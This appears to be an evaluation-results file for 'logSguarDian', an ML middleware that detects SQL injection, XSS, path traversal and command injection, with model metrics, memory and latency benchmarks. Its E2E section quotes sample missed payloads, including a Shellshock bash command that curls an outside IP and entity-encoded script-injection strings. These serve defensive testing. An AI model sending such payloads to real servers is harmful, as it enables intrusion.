# Evaluation Results — logSguarDian

Metrics collected during the F3–F6 pipeline execution. Each section corresponds
to a gate in PLAN.md.

---

## F3 — Model Metrics (val set)

**Update (rf_v3/if_v2 retrain):** these models replace rf_v2/if_v1 after two fixes
motivated by the F5.7 E2E suite — HTML entity decoding for XSS features and
`modsec_learn` method/path normalization (`GET`/`/` instead of blank). See §F5.7
below for the root-cause analysis and the new post-fix E2E results. The historical
rf_v1→rf_v2 memory investigation further down this document is left intact as the
record of how the n=30/max_depth=25 configuration was originally chosen; that
configuration was reused unchanged for rf_v3.

### Random Forest — rf_v3.pkl (n=30, max_depth=25, class_weight=balanced_subsample)

| Metric | Value | rf_v2 (prior) |
|--------|-------|---------------|
| Macro F1 (val) | 0.9677 | 0.9705 |
| F1 cmdi | 0.8953 ✓ | 0.9024 |
| F1 path_traversal | 0.9668 ✓ | 0.9723 |
| F1 sqli | 0.9952 ✓ | 0.9960 |
| F1 xss | 0.9826 ✓ | 0.9834 |
| F3.3 gate (4/4 classes ≥ 0.80) | **PASS ✓** | PASS |

Small movements across the board (val macro F1 −0.0028), consistent with the
modsec_learn fix touching ~90K benign + ~30K sqli training rows' feature values
slightly — not a regression signal. Val-set XSS F1 did not improve from the entity
decode fix (see §F5.7 for why the E2E live-HTTP detection rate, not this offline
metric, is where that fix is expected to show up).

Top 10 features (mean impurity decrease):

| # | Feature | Importance |
|---|---------|-----------|
| 1 | ua_length | 0.0796 |
| 2 | special_char_ratio | 0.0718 |
| 3 | path_length | 0.0544 |
| 4 | path_depth | 0.0488 |
| 5 | traversal_sequence_count | 0.0459 |
| 6 | url_encoded_ratio | 0.0449 |
| 7 | uri_length | 0.0447 |
| 8 | numeric_char_ratio | 0.0403 |
| 9 | payload_entropy | 0.0389 |
| 10 | xss_marker_density | 0.0368 |

### Isolation Forest — if_v2.pkl (200 trees, benign-only, contamination=0.05)

| Metric | Value | if_v1 (prior) |
|--------|-------|---------------|
| Recall (attacks flagged as anomaly, val) | 0.6645 | 0.6654 |
| False Positive Rate (benign flagged as anomaly, val) | 0.0996 | 0.0990 |
| Threshold (IF score) | 0.0445 | 0.04428754 |

Essentially unchanged — expected, since IF trains unsupervised on benign features
only and just 4/72 features shifted for a subset of records.

---

## F4.2 — Python Parity (sklearn vs onnxruntime)

| Model | Max diff | Criterion | Result |
|-------|---------|-----------|--------|
| rf.onnx (predict_proba, 1000 samples) | 9.81e-08 | < 0.001 | PASS ✓ |
| if.onnx (decision_function, 1000 samples) | 2.38e-07 | < 0.001 | PASS ✓ |

(rf_v3/if_v2 generation; prior rf_v2/if_v1 generation measured 1.13e-07 / 1.89e-07 — both well within gate.)

---

## F4.3 — Node Parity (onnxruntime-node vs Python)

Verified in `packages/core/tests/parity.node.test.ts` with 100 synthetic
float32 samples (seed 42). Fixture regenerated for rf_v3/if_v2 via
`training/export_parity_fixture.py`.

| Model | Max diff (Python vs Node) | Criterion | Result |
|-------|--------------------------|-----------|--------|
| rf.onnx (predict_proba) | 0.0 (exact) | < 1e-5 | PASS ✓ |
| if.onnx (decision_function) | 0.0 (exact) | < 1e-5 | PASS ✓ |

5/5 parity tests pass, including class-order and threshold-consistency checks.
Versions: onnxruntime (Python) · onnxruntime-node@1.26.0 · Node.js v25.6.0

---

## F4.4 — ONNX Memory Footprint

### GATE REVISED: 150 MB → 300 MB

**Rationale:** The original 150 MB gate was set before measuring ORT's actual
behavior. The `TreeEnsembleClassifier` operator materializes the full tree structure
into native C++ memory (~1.264 KB/node). Any RF configuration that satisfies F3.3
(4/4 classes ≥ 0.80) requires max_depth ≥ 25, which produces ≥ 180,000 nodes and
exceeds 150 MB. The gate was revised to 300 MB after confirming this footprint is
operationally acceptable on a server with 8+ GB RAM.

---

### F4.4 Investigation Timeline

**Step 1 — Initial measurement (rf_v1: n=100, max_depth=40)**

| Stage | RSS (MB) | Δ cumulative (MB) |
|-------|----------|------------------|
| Baseline | 57.66 | — |
| After loading rf.onnx | 522.36 | +464.70 |
| After loading if.onnx | 544.78 | +487.12 |
| Warmup (20 calls) | 545.94 | +488.28 |
| 2000 calls (leak check) | 548.64 | +490.98 |

Total Δ RSS: **490.98 MB** | Gate F4.4 (≤ 150 MB): **FAIL ✗**

Diagnosis: rf_v1 had 367,655 nodes × 1.264 KB/node ≈ 465 MB RSS. No leak confirmed:
growth over 2000 calls = +2.70 MB. V8 heap stable (~4 MB).

**Step 2 — Hyperparameter sweep (initial grid, max_depth ≤ 20)**

| n_est | max_depth | Nodes | Est. RSS (MB) | Macro F1 | cmdi | ≥ 0.80 |
|------:|----------:|------:|--------------:|---------:|-----:|:------:|
| 30 | 15 | 62,130 | 76.7 | 0.8927 | 0.593 | 3/4 |
| 30 | 20 | 126,094 | 155.6 | 0.9424 | 0.772 | 3/4 |
| 50 | 15 | 104,736 | 129.3 | 0.8974 | 0.612 | 3/4 |
| 50 | 20 | 211,578 | 261.2 | 0.9414 | 0.767 | 3/4 |
| 100 | 15 | 211,746 | 261.4 | 0.8952 | 0.606 | 3/4 |

cmdi below 0.80 in all configurations — separability problem, not a tuning problem.

**Step 3 — Expanded grid (max_depth ≥ 25)**

| n_est | max_depth | Nodes | Est. RSS (MB) | Macro F1 | cmdi | ≥ 0.80 |
|------:|----------:|------:|--------------:|---------:|-----:|:------:|
| 30 | 25 | 180,022 | 222.2 | 0.9705 | 0.902 | **4/4** |
| 30 | 30 | 210,196 | 259.5 | 0.9737 | 0.922 | **4/4** |
| 50 | 25 | 304,774 | 376.2 | 0.9724 | 0.911 | **4/4** |
| 50 | 30 | 350,232 | 432.3 | 0.9742 | 0.923 | **4/4** |
| 30 | None | 219,110 | 270.5 | 0.9723 | 0.916 | **4/4** |

Smallest configuration with 4/4: n=30, max_depth=25. Estimated RSS 222 MB —
incompatible with the 150 MB gate but viable under the revised 300 MB gate.

**Step 4 — SMOTE experiment (negative result, 2026-06-14)**

SMOTE applied to train set only (cmdi: 3,881 → 25,000 synthetic). Val and test
untouched.

| n_est | max_depth | Macro F1 | cmdi (no SMOTE) | cmdi (SMOTE) | Δ cmdi |
|------:|----------:|---------:|----------------:|-------------:|-------:|
| 30 | 15 | 0.8964 | 0.593 | 0.608 | +0.015 |
| 30 | 20 | 0.9404 | 0.772 | 0.763 | −0.009 |
| 50 | 15 | 0.8946 | 0.612 | 0.601 | −0.011 |

Marginal gain (+0.015 at depth=15). No configuration within the 128 MB RF budget
reaches cmdi ≥ 0.80. Diagnosis: feature space separability, not sample count.
Documented in `training/SAMPLING_STRATEGY.md §3`.

**Step 5 — Decision: revise gate to 300 MB**

Selected configuration: n=30, max_depth=25, no SMOTE, class_weight='balanced_subsample'.

**Step 6 — Final measurement (rf_v2: n=30, max_depth=25)**

Script: `benchmarks/onnx-memory.bench.js`  
Environment: Node.js v25.6.0 · macOS 26.3.1 · Apple Silicon (arm64)

| Stage | RSS (MB) | Δ cumulative (MB) |
|-------|----------|------------------|
| Baseline | 57.80 | — |
| After loading rf.onnx | 180.16 | +122.36 |
| After loading if.onnx | 202.27 | +144.47 |
| Warmup (20 calls) | 202.97 | +145.17 |
| 2000 calls (leak check) | 204.47 | +146.67 |

Total Δ RSS: **146.67 MB** | Gate F4.4 (≤ 300 MB): **PASS ✓**

No leak: growth over 2000 calls = +1.50 MB. V8 heap stable (~4 MB).

---

### Before/After Comparison

| Dimension | rf_v1 (n=100, depth=40) | rf_v2 (n=30, depth=25) | Change |
|-----------|------------------------|------------------------|--------|
| Total nodes | 367,655 | 180,022 | −51% |
| Size on disk | 44 MB | 10.8 MB | −75% |
| Δ RSS (fully warm) | 490.98 MB | 146.67 MB | −70% |
| Macro F1 (val) | 0.975 | 0.9705 | −0.005 |
| F1 cmdi | ≥ 0.80 | 0.9024 | — |
| F1 path_traversal | ≥ 0.80 | 0.9723 | — |
| F1 sqli | ≥ 0.80 | 0.9960 | — |
| F1 xss | ≥ 0.80 | 0.9834 | — |
| F3.3 gate (4/4 ≥ 0.80) | PASS | PASS | — |
| F4.4 gate (≤ 300 MB) | FAIL (490 MB) | **PASS** (147 MB) | ✓ |

70% RSS reduction with a 0.005 macro F1 loss. The smaller model passes all quality thresholds.

**Step 7 — Reconfirmation after rf_v3/if_v2 retrain**

Same config (n=30, max_depth=25) re-measured after the modsec_learn/XSS-decode
retrain, via the same script:

| Stage | RSS (MB) | Δ cumulative (MB) |
|-------|----------|------------------|
| Baseline | 62.03 | — |
| After loading rf.onnx | 186.61 | +124.58 |
| After loading if.onnx | 207.64 | +145.61 |
| Warmup (20 calls) | 208.42 | +146.39 |
| 2000 calls (leak check) | 210.06 | +148.03 |

Total Δ RSS: **148.03 MB** | Gate F4.4 (≤ 300 MB): **PASS ✓** (also under the
original 150 MB gate). No leak: growth over 2000 calls = +1.64 MB. Consistent
with rf_v2's 146.67 MB — model architecture unchanged, only training data.

---

---

## A19 — Latency benchmark (worker_thread feature extraction)

Artillery load test — Express server, 50 arr/s, 30 s, 3 000 HTTP requests per run.  
Feature extraction runs inside `worker_thread` via `extractFeatureVector()` from `@logsguardian/extractor`.  
Configs: `packages/core/bench/logsguardian.yml` | Results: `bench-baseline.json`, `bench-mw.json`  
Environment: Node.js v22.5.1 · Windows 11 (WSL2) · 2026-07-09

| Scenario | p50 (ms) | p95 (ms) | p99 (ms) | max (ms) | requests | failed |
|---|---|---|---|---|---|---|
| Baseline (no middleware) | 0 | 1 | 1 | 9 | 3 000 | 0 |
| + logsguardian (monitor) | 0 | 1 | 1 | 9 | 3 000 | 0 |
| **Δ p95** | | **0 ms** | | | | |

Criterion: Δp95 ≤ 5 ms → **PASS ✓**

---

### Thesis — Limitations Paragraph (Section 8.3)

> The model size reduction was motivated by a memory constraint in ONNX Runtime
> discovered during F4.4 validation: the `TreeEnsembleClassifier` operator
> materializes the full tree structure into native memory when the session is created,
> with an expansion factor of approximately 10× relative to disk size (44 MB → 465 MB
> for the original model). The hyperparameter sweep revealed that the minority class
> cmdi requires `max_depth ≥ 25` to exceed the F1=0.80 threshold — a feature space
> separability problem, not a data quantity problem, confirmed by the SMOTE experiment
> (+0.015 improvement at depth=15, no impact at depth=20). The final configuration
> (n=30, max_depth=25) reduces the footprint by 70% relative to the original model
> (490 MB → 147 MB) with a loss of only 0.005 in macro F1.

---

## A15/A20 — ONNX Inference Module (CLOSED)

Implementation: `packages/core/src/worker.ts` (merged PR #18)

| Requirement | Implementation | Status |
|-------------|----------------|--------|
| Load rf.onnx + if.onnx at startup | `Promise.all([ort.InferenceSession.create(rf.onnx), ort.InferenceSession.create(if.onnx)])` | ✓ |
| Inference latency < 3ms p95 | p50=0.823ms, p95=1.044ms, p99=1.130ms | PASS |
| Decision policy per decision-policy.md | `RF_THRESHOLD=0.70`, `IF_THRESHOLD=0.044498153738474766` (if_v2) applied in `middleware.ts` (IF log-only, not in worker.ts) | ✓ |
| Fail-open on session load failure | `try/catch` around `await sessionsPromise` in the per-request handler replies `{id, error}` instead of crashing; `middleware.ts` also has `worker.on("error")` as a second fail-open layer | ✓ |
| Feature reduction 72→66 | By name via `EXCLUDED_NAMES` set, mapped to `MODEL_INDICES` against `FEATURE_NAMES` | ✓ |
| Parallel RF+IF inference | `Promise.all([rfSession.run(...), ifSession.run(...)])` | ✓ |
| Warmup (dummy inference after load) | **Absent** — confirmed still not implemented | ✗ (not required by acceptance criteria) |

**Latency methodology note:** an initial burst-fire benchmark (100 requests sent without waiting for replies) produced p50=80.6ms / p95=116.6ms — this was a queuing artifact of `worker_threads` message-passing under load, not per-request inference cost (round-trip times grew linearly ~1.3ms/request, consistent with FIFO queuing). Re-measured with serial request/response (200 requests, 20-request warmup discarded, `process.hrtime.bigint()` around each round-trip) to isolate true single-request latency.

Latency: p50=0.823ms, p95=1.044ms, p99=1.130ms (worker round-trip only, not full middleware+extractor path)
Hardware: node v25.6.0 on Apple Silicon

---

## F1.8 — Extractor Benchmark (CLOSED)

Implementation: `benchmarks/extractor.bench.js`

| Fixture | p50 (ms) | p95 (ms) | p99 (ms) | Throughput (req/s) |
|---------|---------:|---------:|---------:|--------------------:|
| benign | 0.0067 | 0.0092 | 0.0326 | 132,602 |
| sqli | 0.0058 | 0.0065 | 0.0276 | 158,356 |
| xss | 0.0063 | 0.0083 | 0.0265 | 144,689 |
| path_traversal | 0.0044 | 0.0061 | 0.0226 | 200,739 |
| cmdi | 0.0055 | 0.0073 | 0.0250 | 164,435 |
| **mixed (round-robin)** | **0.0059** | **0.0082** | **0.0261** | **156,924** |

**GATE p95 ≤ 1ms: PASS ✓** (mixed-traffic p95 = 0.0082ms — roughly 120× under the 1ms threshold)

Methodology: serial measurement (not burst-fire), 200-iteration warmup discarded, 2000 iterations per fixture, `process.hrtime.bigint()` resolution. Fixtures cover all 5 output classes (benign, sqli, xss, path_traversal, cmdi); `body` is passed as a JSON-stringified string (not an object), matching how `middleware.ts` builds the `CanonicalRequest` before calling the extractor.

Hardware: Node v25.6.0 on darwin/arm64 (Apple Silicon)

Note: this benchmark measures `extractFeatureVector()` in the main thread. In production, extraction runs inside the `worker_thread` (see A15/A20 above) — main-thread latency is therefore not directly on the critical path, but serves as the reference for F1.8 and the baseline for the full middleware benchmark (A19 above, F6).

---

## F5.7 — E2E Detection Suite (GATE)

**Status: PASS ✓ (after three fixes — see §F5.7 Update below for the final result.
The original FAIL run is kept intact underneath as the record of what motivated
each fix.)**

Implementation: `e2e/detection.test.ts` + `e2e/test-app.ts`, run via `pnpm run test:e2e`.

Methodology: 100 payloads sampled per class (`random.seed(42)`) from
`training/data_clean/*.jsonl` (excluding `unified.jsonl`), sent as real HTTP
requests via `supertest` to a live Express app running the actual
`logsguardian` middleware with the real ONNX models (`rf.onnx`, `if.onnx` from
`training/models/`) — no mocked inference. `mode: 'block'`, default
`RF_THRESHOLD=0.70`. Environment: Node.js v25.6.0, darwin/arm64.

| Class | Detected | Total | Detection Rate | Criterion | Result |
|-------|----------|-------|-----------------|-----------|--------|
| sqli | 84 | 100 | 84.0% | ≥80% | PASS ✓ |
| xss | 77 | 100 | 77.0% | ≥80% | **FAIL ✗** |
| path_traversal | 93 | 100 | 93.0% | ≥80% | PASS ✓ |
| cmdi | 36 | 100 | 36.0% | ≥80% | **FAIL ✗** |
| benign | 21 (FP) | 100 | 21.0% FP | ≤20% | **FAIL ✗** |

**Overall GATE F5.7: FAIL ✗**

This is reported as an honest failure, per the R2 policy applied elsewhere in
this document (see decision-policy.md §2.3): the threshold was not adjusted
and payloads were not cherry-picked to force a pass.

### Root-cause analysis

Each failing class was investigated by cross-referencing the logged verdict,
predicted class, RF confidence, and IF score per payload (via a temporary
SQLite log), not just the pass/fail count. Two distinct causes were found,
and they are not the same problem:

**1. A methodology artifact inflates the benign FP rate (not a genuine model
failure).** 93 of the 100 sampled benign payloads originate from dataset
sources (`modsec_learn.jsonl`, `payload_full.jsonl`, `payloads_csv.jsonl`)
that only captured the query/body of a request, leaving `method` and `path`
as empty strings (`""`) in the training data. A live HTTP client — including
this E2E harness — cannot send a request without a method and a path; Express
always reports a real value (`"GET"`, `"/"`). Reconstructing these fixtures as
real HTTP therefore changes the feature vector's `method`/`path`-derived
features from their trained (blank) distribution to a value the model never
saw associated with `benign` for these sources.

Isolated verification: the identical query `v=1651145922` with
`method="", path=""` scores **99.9% benign**; the same query with
`method="GET", path="/"` (what any real client actually sends) scores
**80.7% xss**. Nothing else changes — same query, same empty user-agent,
same empty cookie.

Breakdown (blocked / total) by whether the source record had blank vs. real
`method`+`path`:

| Class | Blank method/path | Real method/path |
|-------|-------------------|-------------------|
| benign | 20/93 (21.5% FP) | 1/7 (14.3% FP) |
| xss | 26/26 blocked (100%) | 51/74 blocked (68.9%) |
| cmdi | 1/7 blocked (14.3%) | 35/93 blocked (37.6%) |

93% of the benign sample falls in the blank-field group, so this artifact
accounts for nearly all of the observed 21% FP rate. **This is a training-data
heterogeneity issue, not evidence that the model is unsafe in production** —
if anything, it implies the official offline test-set metrics
(decision-policy.md §2) may themselves be computed from feature vectors that
share this same blank-field distribution, so they could be optimistic
relative to a deployment where `method`/`path` are always populated. This is
now tracked as a limitation (see `docs/limitations.md` §6).

**2. cmdi and xss show genuine detection weakness on properly-formed HTTP
requests — this is consistent with the training-time findings.** Restricting
to records that already had a real `method`/`path` (i.e. excluding the
artifact above), cmdi detects only **35/93 (37.6%)** and xss **51/74 (68.9%)**
— both still below the 80% gate. Representative missed payloads:

- cmdi: ``() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"`` (verdict=pass, pred=xss, conf=0.60); a base64/PHP `exec()` payload against `/blog/wp-login.php` (verdict=pass_anomaly, pred=cmdi, conf=0.633 — below the 0.70 RF_THRESHOLD, only anomaly-logged, not blocked).
- xss: ``q=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;`` and ``&lt;script&gt;alert("maxwel")&lt;/script&gt;`` — both **HTML-entity-encoded** rather than URL-encoded (`%3Cscript%3E`). Every xss miss inspected uses HTML-entity encoding; every xss hit inspected uses URL encoding or raw `<script>`.

For cmdi, this matches the separability problem already documented in
`limitations.md` §1 (SMOTE negative result, shell-syntax payloads overlapping
benign filesystem paths). For xss, this is a **new, more specific finding**:
the extractor's pattern features do not appear to recognize HTML-entity
encoding (`&lt;`, `&gt;`, `&quot;`) as an XSS obfuscation technique, only
URL/percent-encoding and raw markup — an evasion gap, not a capacity problem
(RF confidence on these misses is 0.50–0.67, i.e. the model leans xss but
under the 0.70 block threshold, not confidently benign).

**Disposition (original run):** not remediated at the time, per the same
rationale used for the IF FP gate in decision-policy.md §2.3 — fixing this
required re-processing the training data to normalize `method`/`path` fields
across sources (blank-field artifact) and adding an HTML-entity-decoding
normalization step to the extractor before pattern matching (xss evasion
gap), both of which required re-running the full F3–F5 retrain/export
pipeline. That work is documented in `docs/limitations.md` §6 and §7 and in
the update below.

---

### F5.7 Update — Post-fix retrain (rf_v3/if_v2) and threshold recalibration

Three changes were applied, in order, to close this gate:

1. **HTML entity decoding** added to XSS feature extraction
   (`packages/extractor/src/normalizers.ts` + `semantic.ts`) — addresses the
   xss evasion gap from §2 above.
2. **`modsec_learn` method/path normalization** (`method=""` → `"GET"`,
   `path=""` → `"/"` in `training/parsers/parse_modsec_learn.py`) — addresses
   the blank-field benign-FP artifact from §1 above.
3. **`RF_THRESHOLD` recalibrated from 0.70 to 0.35** for rf_v3
   (`docs/decision-policy.md` §2.2.1) — fixes 1 and 2 alone were **not
   sufficient**: after retraining on the corrected data, a first E2E run at
   the old `RF_THRESHOLD=0.70` still failed (xss 70/100, cmdi 34/100),
   revealing that the retrain shifted rf_v3's confidence calibration
   relative to rf_v2 — recognition of attack payloads improved, but many
   true positives scored below the 0.70 gate that would previously have
   cleared it. Recalibrating the threshold on the validation set (not the
   locked test set — see decision-policy.md §2.2.1 for why) resolved this.

Full pipeline re-run: `unify.py` → TS extractor CLI → `csv_to_parquet.py` →
`split.py` (new `test.lock.sha256` committed before training, per R2) →
retrain RF (`rf_v3.pkl`) + IF (`if_v2.pkl`) → ONNX export/parity → E2E.

**Final E2E result (rf_v3/if_v2, `RF_THRESHOLD=0.35`):**

| Class | Detected | Total | Detection Rate | Criterion | Result |
|-------|----------|-------|-----------------|-----------|--------|
| sqli | 99–100 | 100 | 99.0–100.0% | ≥80% | PASS ✓ |
| xss | 94 | 100 | 94.0% | ≥80% | PASS ✓ |
| path_traversal | 100 | 100 | 100.0% | ≥80% | PASS ✓ |
| cmdi | 95 | 100 | 95.0% | ≥80% | PASS ✓ |
| benign | 2 (FP) | 100 | 2.0% FP | ≤20% | PASS ✓ |

**Overall GATE F5.7: PASS ✓**

(sqli showed a 1-sample discrepancy between the individual per-class test run
and the aggregate summary test run within the same suite execution — 99 vs
100 blocked out of the same 100 fixtures. Both are comfortably above the 80%
gate; not investigated further.)

**What each fix actually bought:**
- Benign FP: 21.0% → 2.0% — the modsec_learn fix did almost all of this work;
  the residual 2% is unrelated to the original blank-field artifact.
- cmdi: 36% → 95% — this jump is almost entirely the threshold recalibration
  (0.70→0.35), not new feature signal; cmdi's underlying separability
  problem (`limitations.md` §1) is unchanged, but at 0.35 the model's
  existing (correct) cmdi/sqli-leaning predictions clear the bar more often.
- xss: 77% → 94%, but non-monotonically — an intermediate run at rf_v3 with
  `RF_THRESHOLD` still at 0.70 actually **regressed** to 70% before the
  threshold recalibration recovered it to 94%. The entity-decode fix alone
  was necessary but not sufficient; see `docs/limitations.md` §7 for the
  full account of why (confidence calibration shift, not a decode failure).

**Open item carried forward:** `RF_THRESHOLD=0.35` was calibrated on val only.
A one-time R2 confirmation read of the test set at this threshold is still
pending — tracked in `docs/decision-policy.md` §6 (P1).

